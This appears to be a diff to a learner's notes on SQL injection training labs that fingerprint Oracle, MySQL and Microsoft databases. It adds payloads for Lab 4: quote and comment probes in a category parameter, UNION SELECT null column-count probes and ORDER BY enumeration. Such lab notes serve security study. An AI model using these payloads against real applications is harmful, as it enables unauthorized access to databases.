@@ -20,7 +20,7 @@ Lab3 : Lab: SQL injection attack, querying the database type and version on Orac
 Ans  : category='
        category='--+
 
-    - No of colums
+    - No of columns
        'union select null from dual--
        'union select null,null from dual--
 
@@ -34,4 +34,15 @@ Ans  : category='
 ___________________________________________________________________________________________
 Lab4 : SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-Ans  : 
+Ans  : GET /filter?category='
+       GET /filter?category='--+
+
+     - No of Columns
+       ' union select null --+ Error
+       ' union select null,null --+ 
+       
+       ' order by 1--+
+       ' order by 2--+
+       ' order by 3--+ Error
+
+
